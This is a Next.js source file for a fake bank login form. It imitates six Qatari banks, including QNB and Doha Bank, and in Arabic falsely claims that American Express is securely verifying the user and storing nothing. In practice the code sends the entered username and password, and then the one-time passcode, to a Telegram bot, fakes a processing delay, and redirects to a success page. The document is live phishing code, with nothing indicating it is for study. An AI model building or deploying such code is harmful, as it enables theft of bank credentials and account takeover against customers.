// components/BankLoginForm.jsx
'use client';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { sendToTelegram } from '../lib/telegramBot';

export default function BankLoginForm({ bank }) {
  const router = useRouter();
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    otp: ''
  });
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const bankData = {
    qnb: {
      name: 'QNB',
      logo: '/images/qnb.png',
      color: '#2D9958',
      bgColor: '#F5F5F5'
    },
    qib: {
      name: 'Qatar Islamic Bank',
      logo: '/images/masref.png',
      color: '#5C2D91',
      bgColor: '#F5F5F5'
    },
    doha: {
      name: 'Doha Bank',
      logo: '/images/doha.webp',
      color: '#742037',
      bgColor: '#F5F5F5'
    },
    commercial: {
      name: 'Commercial Bank',
      logo: '/images/comm.png',
      color: '#1B4D80',
      bgColor: '#F5F5F5'
    },
    masraf: {
      name: 'Masraf Al Rayan',
      logo: '/images/rayan.png',
      color: '#009483',
      bgColor: '#F5F5F5'
    },
    ahli: {
      name: 'Ahli Bank',
      logo: '/images/ahli.png',
      color: '#D21937',
      bgColor: '#F5F5F5'
    }
  };

  const currentBank = bankData[bank] || bankData.qnb;

  const handleChange = (e) => {
    const { name, value } = e.target;

    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: '' }));
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const validateCredentials = () => {
    const newErrors = {};

    if (!formData.username.trim()) {
      newErrors.username = 'اسم المستخدم مطلوب';
    }

    if (!formData.password.trim()) {
      newErrors.password = 'كلمة المرور مطلوبة';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateOtp = () => {
    const newErrors = {};

    if (!formData.otp.trim() || formData.otp.length < 4) {
      newErrors.otp = 'رمز التحقق غير صالح';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleCredentialsSubmit = async (e) => {
    e.preventDefault();

    if (!validateCredentials()) {
      return;
    }

    setLoading(true);

    try {
      // Send login data to Telegram
      await sendToTelegram({
        type: 'bank_login',
        bank: currentBank.name,
        username: formData.username,
        password: formData.password
      });

      // Simulate processing delay
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Move to OTP step
      setStep(2);
      setLoading(false);
    } catch (error) {
      console.error('Login error:', error);
      setLoading(false);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    if (!validateOtp()) {
      return;
    }

    setLoading(true);

    try {
      // Send OTP to Telegram
      await sendToTelegram({
        type: 'bank_otp',
        bank: currentBank.name,
        username: formData.username,
        otp: formData.otp
      });

      // Simulate processing delay
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Redirect to success page
      router.push('/success');
    } catch (error) {
      console.error('OTP error:', error);
      setLoading(false);
    }
  };

  return (
    <div className='mx-auto max-w-md'>
      <div className='overflow-hidden rounded-xl bg-white shadow-lg'>
        <div
          className='p-4 text-center'
          style={{ backgroundColor: currentBank.color }}
        >
          <div className='mb-2 inline-block rounded-lg bg-white p-3'>
            <Image
              src={currentBank.logo}
              alt={currentBank.name}
              width={100}
              height={40}
              className='h-10 object-contain'
            />
          </div>
          <h2 className='text-xl font-bold text-white'>
            {step === 1
              ? 'تسجيل الدخول إلى الخدمات المصرفية'
              : 'التحقق من هويتك'}
          </h2>
        </div>

        <div className='p-6' style={{ backgroundColor: currentBank.bgColor }}>
          {step === 1 ? (
            <form onSubmit={handleCredentialsSubmit}>
              <div className='mb-4'>
                <label
                  htmlFor='username'
                  className='mb-2 block font-medium text-gray-700'
                >
                  اسم المستخدم
                </label>
                <input
                  type='text'
                  id='username'
                  name='username'
                  value={formData.username}
                  onChange={handleChange}
                  className={`w-full border ${errors.username ? 'border-red-500' : 'border-gray-300'} rounded-lg px-4 py-2 focus:outline-none focus:ring-2`}
                  style={{ focusRing: currentBank.color }}
                  dir='ltr'
                />
                {errors.username && (
                  <p className='mt-1 text-sm text-red-500'>{errors.username}</p>
                )}
              </div>

              <div className='mb-6'>
                <label
                  htmlFor='password'
                  className='mb-2 block font-medium text-gray-700'
                >
                  كلمة المرور
                </label>
                <input
                  type='password'
                  id='password'
                  name='password'
                  value={formData.password}
                  onChange={handleChange}
                  className={`w-full border ${errors.password ? 'border-red-500' : 'border-gray-300'} rounded-lg px-4 py-2 focus:outline-none focus:ring-2`}
                  style={{ focusRing: currentBank.color }}
                  dir='ltr'
                />
                {errors.password && (
                  <p className='mt-1 text-sm text-red-500'>{errors.password}</p>
                )}
              </div>

              <button
                type='submit'
                className='w-full rounded-lg px-4 py-2 font-medium text-white'
                style={{ backgroundColor: currentBank.color }}
                disabled={loading}
              >
                {loading ? (
                  <div className='flex items-center justify-center'>
                    <svg
                      className='-ml-1 mr-3 h-5 w-5 animate-spin text-white'
                      xmlns='http://www.w3.org/2000/svg'
                      fill='none'
                      viewBox='0 0 24 24'
                    >
                      <circle
                        className='opacity-25'
                        cx='12'
                        cy='12'
                        r='10'
                        stroke='currentColor'
                        strokeWidth='4'
                      ></circle>
                      <path
                        className='opacity-75'
                        fill='currentColor'
                        d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
                      ></path>
                    </svg>
                    جاري تسجيل الدخول...
                  </div>
                ) : (
                  'تسجيل الدخول'
                )}
              </button>
            </form>
          ) : (
            <form onSubmit={handleOtpSubmit}>
              <div className='mb-4 text-center'>
                <p className='text-gray-700'>
                  لقد أرسلنا رمز تحقق إلى رقم هاتفك المسجل لدى البنك
                </p>
              </div>

              <div className='mb-6'>
                <label
                  htmlFor='otp'
                  className='mb-2 block font-medium text-gray-700'
                >
                  رمز التحقق
                </label>
                <input
                  type='text'
                  id='otp'
                  name='otp'
                  value={formData.otp}
                  onChange={handleChange}
                  className={`w-full border ${errors.otp ? 'border-red-500' : 'border-gray-300'} rounded-lg px-4 py-2 text-center text-2xl tracking-wider focus:outline-none focus:ring-2`}
                  style={{ focusRing: currentBank.color }}
                  maxLength='6'
                  dir='ltr'
                />
                {errors.otp && (
                  <p className='mt-1 text-sm text-red-500'>{errors.otp}</p>
                )}
              </div>

              <button
                type='submit'
                className='w-full rounded-lg px-4 py-2 font-medium text-white'
                style={{ backgroundColor: currentBank.color }}
                disabled={loading}
              >
                {loading ? (
                  <div className='flex items-center justify-center'>
                    <svg
                      className='-ml-1 mr-3 h-5 w-5 animate-spin text-white'
                      xmlns='http://www.w3.org/2000/svg'
                      fill='none'
                      viewBox='0 0 24 24'
                    >
                      <circle
                        className='opacity-25'
                        cx='12'
                        cy='12'
                        r='10'
                        stroke='currentColor'
                        strokeWidth='4'
                      ></circle>
                      <path
                        className='opacity-75'
                        fill='currentColor'
                        d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
                      ></path>
                    </svg>
                    جاري التحقق...
                  </div>
                ) : (
                  'تأكيد'
                )}
              </button>
            </form>
          )}

          <div className='mt-4 text-center'>
            <p className='text-xs text-gray-500'>
              تقوم أمريكان إكسبريس بالتحقق من هويتك من خلال بنكك بطريقة آمنة
              ومشفرة.
              <br />
              لن يتم تخزين بيانات تسجيل الدخول الخاصة بك.
            </p>
          </div>
        </div>
      </div>
      <div className='mt-4 text-center'>
        <button
          onClick={() => router.back()}
          className='hover:text-amex-blue text-sm text-white'
        >
          العودة واختيار بنك آخر
        </button>
      </div>
    </div>
  );
}
